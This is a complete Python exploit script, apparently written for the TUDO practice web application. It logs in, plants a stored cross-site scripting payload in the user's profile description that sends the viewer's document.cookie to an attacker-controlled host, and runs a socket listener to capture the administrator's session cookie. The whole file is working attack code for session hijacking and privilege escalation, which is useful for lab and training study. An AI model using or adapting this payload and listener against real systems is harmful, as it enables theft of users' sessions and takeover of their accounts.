#!/usr/bin/python3

# @title  TUDO Privilege Escalation (Session Riding)
# @author William Moody
# @date   10.03.2021

import requests
import sys
import subprocess
import socket

if len(sys.argv) != 5:
	print('usage: %s TargetIp AttackIp Username Password'%sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]
host   = sys.argv[2]
user   = sys.argv[3]
passwd = sys.argv[4]

lport  = 9000
s = requests.Session()

# -=-=-=-=-=

def login():
	d = {'username':user,'password':passwd}
	r = s.post("http://%s/login.php"%target, data=d)
	return "[MoTD]" in r.text

def set_desc(d):
	d = {"description":d}
	r = s.post("http://%s/profile.php"%target,data=d)
	return "Success" in r.text

# -=-=-=-=-=

if login():
	print("[+] Logged in!")
else:
	print("[-] Failed to log in.")
	sys.exit(-1)

if set_desc("<script>document.write('<img src=http://%s:%d/'+document.cookie+' />');</script>"%(host,lport)):
	print("[+] Changed description!")
else:
	print("[-] Failed to change description.")
	sys.exit(-1)

print("[*] Setting up listener on port %d..."%lport)
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host,lport))
s.listen()

print("[*] Waiting for admin to trigger XSS...")
(sock_c, ip_c) = s.accept()
get_request = sock_c.recv(4096)
admin_cookie = get_request.split(b" HTTP")[0][5:].decode("UTF-8")

print("[+] Stole admin's cookie:")
print("    -- " + admin_cookie)
